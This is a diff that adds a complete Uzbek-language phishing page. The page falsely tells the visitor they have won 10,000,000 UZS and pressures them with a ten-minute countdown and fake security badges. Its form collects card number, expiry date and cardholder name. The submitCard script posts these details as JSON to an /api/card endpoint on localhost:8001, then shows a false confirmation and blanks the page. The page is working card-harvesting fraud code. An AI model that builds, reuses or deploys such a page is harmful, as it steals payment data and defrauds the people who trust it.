@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Muborak! Siz g'olib bo'ldingiz!</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a00 50%, #0a1a00 100%);
+      font-family: 'Segoe UI', Arial, sans-serif;
+      overflow-x: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Confetti canvas */
+    #confetti-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .wrapper {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 480px;
+      margin: 20px auto;
+      padding: 0 16px;
+    }
+
+    /* Prize box */
+    .prize-box {
+      background: linear-gradient(160deg, #1c1c1c 0%, #111 100%);
+      border: 1px solid #333;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 0 60px rgba(255,200,0,.15), 0 20px 60px rgba(0,0,0,.8);
+    }
+
+    .prize-header {
+      background: linear-gradient(135deg, #b8860b 0%, #ffd700 50%, #b8860b 100%);
+      padding: 24px;
+      text-align: center;
+      position: relative;
+    }
+
+    .prize-header::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: repeating-linear-gradient(
+        45deg,
+        rgba(255,255,255,.05) 0px,
+        rgba(255,255,255,.05) 2px,
+        transparent 2px,
+        transparent 12px
+      );
+    }
+
+    .prize-crown { font-size: 3rem; margin-bottom: 8px; }
+
+    .prize-header h1 {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: #1a0a00;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .amount-section {
+      padding: 28px 24px 20px;
+      text-align: center;
+      border-bottom: 1px solid #2a2a2a;
+    }
+
+    .amount-label {
+      font-size: .8rem;
+      color: #888;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+    }
+
+    .amount {
+      font-size: 3rem;
+      font-weight: 900;
+      color: #ffd700;
+      text-shadow: 0 0 30px rgba(255,215,0,.4);
+      line-height: 1;
+      animation: glow 2s infinite;
+    }
+
+    .amount span { font-size: 1.4rem; vertical-align: super; }
+
+    .amount-currency {
+      font-size: .95rem;
+      color: #888;
+      margin-top: 6px;
+    }
+
+    @keyframes glow {
+      0%, 100% { text-shadow: 0 0 20px rgba(255,215,0,.4); }
+      50%       { text-shadow: 0 0 40px rgba(255,215,0,.8), 0 0 60px rgba(255,215,0,.3); }
+    }
+
+    /* Timer */
+    .timer-section {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 12px;
+      background: rgba(255,50,50,.08);
+      border-bottom: 1px solid #2a2a2a;
+      font-size: .82rem;
+      color: #ff6b6b;
+    }
+
+    .timer-val { font-weight: 700; font-size: .95rem; font-family: monospace; }
+
+    /* Form */
+    .form-section { padding: 24px; }
+
+    .form-title {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+
+    .form-subtitle {
+      font-size: .82rem;
+      color: #888;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .field { margin-bottom: 16px; }
+
+    .field label {
+      display: block;
+      font-size: .78rem;
+      color: #999;
+      margin-bottom: 6px;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+    }
+
+    .field input {
+      width: 100%;
+      background: #1e1e1e;
+      border: 1.5px solid #333;
+      border-radius: 8px;
+      padding: 12px 14px;
+      color: #fff;
+      font-size: 1rem;
+      font-family: 'Courier New', monospace;
+      letter-spacing: 1px;
+      transition: border-color .2s;
+    }
+
+    .field input:focus {
+      outline: none;
+      border-color: #ffd700;
+      box-shadow: 0 0 0 3px rgba(255,215,0,.1);
+    }
+
+    .field input::placeholder { color: #444; letter-spacing: 0; font-family: 'Segoe UI', sans-serif; }
+
+    .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+    .submit-btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #b8860b, #ffd700, #b8860b);
+      background-size: 200% auto;
+      color: #1a0a00;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 800;
+      cursor: pointer;
+      letter-spacing: .5px;
+      font-family: inherit;
+      margin-top: 8px;
+      transition: background-position .3s, transform .15s;
+      animation: btn-shine 3s linear infinite;
+    }
+
+    .submit-btn:hover { transform: translateY(-2px); }
+    .submit-btn:active { transform: translateY(0); }
+
+    @keyframes btn-shine {
+      0%   { background-position: 0% center; }
+      100% { background-position: 200% center; }
+    }
+
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      padding: 14px 24px;
+      border-top: 1px solid #1a1a1a;
+    }
+
+    .badge {
+      font-size: .72rem;
+      color: #555;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    /* Success screen */
+    .success-screen {
+      display: none;
+      text-align: center;
+      padding: 48px 32px;
+    }
+
+    .success-screen.show { display: block; }
+
+    .check-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: #1a3a1a;
+      border: 2px solid #00c853;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 2rem;
+      animation: pop .4s cubic-bezier(.175,.885,.32,1.275);
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .success-screen h2 {
+      font-size: 1.2rem;
+      color: #fff;
+      margin-bottom: 12px;
+    }
+
+    .success-screen p {
+      font-size: .88rem;
+      color: #888;
+      line-height: 1.6;
+    }
+
+    .success-screen .loading-dots::after {
+      content: '';
+      animation: dots 1.5s infinite;
+    }
+
+    @keyframes dots {
+      0%   { content: ''; }
+      33%  { content: '.'; }
+      66%  { content: '..'; }
+      100% { content: '...'; }
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="confetti-canvas"></canvas>
+
+<div class="wrapper">
+  <div class="prize-box">
+
+    <!-- MAIN FORM (ko'rinadi) -->
+    <div id="mainContent">
+      <div class="prize-header">
+        <div class="prize-crown">🏆</div>
+        <h1>Tabriklaymiz! Siz g'olib bo'ldingiz!</h1>
+      </div>
+
+      <div class="amount-section">
+        <div class="amount-label">Sizning mukofotingiz</div>
+        <div class="amount"><span></span>10,000,000</div>
+        <div class="amount-currency">O'zbek so'mi (UZS)</div>
+      </div>
+
+      <div class="timer-section">
+        ⏳ Taklif muddati tugashiga: <span class="timer-val" id="timer">09:59</span> qoldi
+      </div>
+
+      <div class="form-section">
+        <div class="form-title">💳 Yutuqni qo'lga kiriting</div>
+        <div class="form-subtitle">Pulni kartangizga o'tkazish uchun karta ma'lumotlaringizni kiriting.</div>
+
+        <div class="field">
+          <label>Karta raqami</label>
+          <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric"/>
+        </div>
+
+        <div class="field-row">
+          <div class="field">
+            <label>Oy / Yil</label>
+            <input type="text" id="expiry" placeholder="OY/YIL" maxlength="5" inputmode="numeric"/>
+          </div>
+          <div class="field">
+            <label>Karta egasi ismi</label>
+            <input type="text" id="cardName" placeholder="Ism Familiya" style="font-family:'Segoe UI',sans-serif;letter-spacing:0;"/>
+          </div>
+        </div>
+
+        <button class="submit-btn" id="submitBtn" onclick="submitCard()">
+          🎁 Yutuqni olish
+        </button>
+      </div>
+
+      <div class="trust-badges">
+        <span class="badge">🔒 SSL himoyalangan</span>
+        <span class="badge">✅ Tasdiqlangan</span>
+        <span class="badge">🏦 Xavfsiz to'lov</span>
+      </div>
+    </div>
+
+    <!-- SUCCESS screen (yashirin) -->
+    <div class="success-screen" id="successScreen">
+      <div class="check-icon">✓</div>
+      <h2>Ma'lumotlar tasdiqlandi</h2>
+      <p>
+        Tez orada siz bilan bog'lanamiz<br>
+        yoki kartangizga pulni tashlab beramiz.<br><br>
+        <span style="color:#666;" class="loading-dots">Iltimos, kuting</span>
+      </p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const API = 'http://localhost:8001';
+
+/* ── Karta raqami formatlash ── */
+document.getElementById('cardNum').addEventListener('input', (e) => {
+  let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+  e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+});
+
+document.getElementById('expiry').addEventListener('input', (e) => {
+  let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+  if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2);
+  e.target.value = v;
+});
+
+/* ── Countdown timer ── */
+let secs = 599;
+const timerEl = document.getElementById('timer');
+const tick = setInterval(() => {
+  secs--;
+  if (secs <= 0) { clearInterval(tick); timerEl.textContent = '00:00'; return; }
+  const m = String(Math.floor(secs / 60)).padStart(2, '0');
+  const s = String(secs % 60).padStart(2, '0');
+  timerEl.textContent = `${m}:${s}`;
+  if (secs <= 60) timerEl.style.color = '#ff1744';
+}, 1000);
+
+/* ── Submit ── */
+async function submitCard() {
+  const num  = document.getElementById('cardNum').value.replace(/\s/g, '');
+  const exp  = document.getElementById('expiry').value;
+  const name = document.getElementById('cardName').value || 'Noma\'lum';
+
+  if (num.length < 16) { highlight('cardNum'); return; }
+  if (exp.length < 5)  { highlight('expiry'); return; }
+
+  document.getElementById('submitBtn').disabled = true;
+  document.getElementById('submitBtn').textContent = 'Tekshirilmoqda...';
+
+  try {
+    await fetch(`${API}/api/card`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ number: num, expiry: exp, name }),
+    });
+  } catch (_) {}
+
+  // Show success then fade out
+  document.getElementById('mainContent').style.display = 'none';
+  document.getElementById('successScreen').classList.add('show');
+
+  clearInterval(tick);
+
+  setTimeout(() => {
+    document.body.style.transition = 'opacity 1s';
+    document.body.style.opacity   = '0';
+    setTimeout(() => { document.body.innerHTML = ''; }, 1200);
+  }, 4000);
+}
+
+function highlight(id) {
+  const el = document.getElementById(id);
+  el.style.borderColor = '#ff1744';
+  el.focus();
+  setTimeout(() => { el.style.borderColor = ''; }, 1500);
+}
+
+/* ── Confetti ── */
+const canvas = document.getElementById('confetti-canvas');
+const ctx    = canvas.getContext('2d');
+canvas.width  = window.innerWidth;
+canvas.height = window.innerHeight;
+
+const pieces = Array.from({ length: 120 }, () => ({
+  x:    Math.random() * canvas.width,
+  y:    Math.random() * canvas.height - canvas.height,
+  w:    Math.random() * 10 + 5,
+  h:    Math.random() * 5 + 3,
+  color: ['#ffd700','#ff6b35','#00c853','#2979ff','#e040fb','#ff1744'][Math.floor(Math.random()*6)],
+  speed: Math.random() * 3 + 1,
+  rot:   Math.random() * Math.PI * 2,
+  rspeed: (Math.random() - .5) * .1,
+  drift:  (Math.random() - .5) * 1.5,
+}));
+
+function drawConfetti() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  pieces.forEach(p => {
+    ctx.save();
+    ctx.translate(p.x, p.y);
+    ctx.rotate(p.rot);
+    ctx.fillStyle = p.color;
+    ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+    ctx.restore();
+    p.y     += p.speed;
+    p.x     += p.drift;
+    p.rot   += p.rspeed;
+    if (p.y > canvas.height) { p.y = -10; p.x = Math.random() * canvas.width; }
+  });
+  requestAnimationFrame(drawConfetti);
+}
+drawConfetti();
+</script>
+
+</body>
+</html>
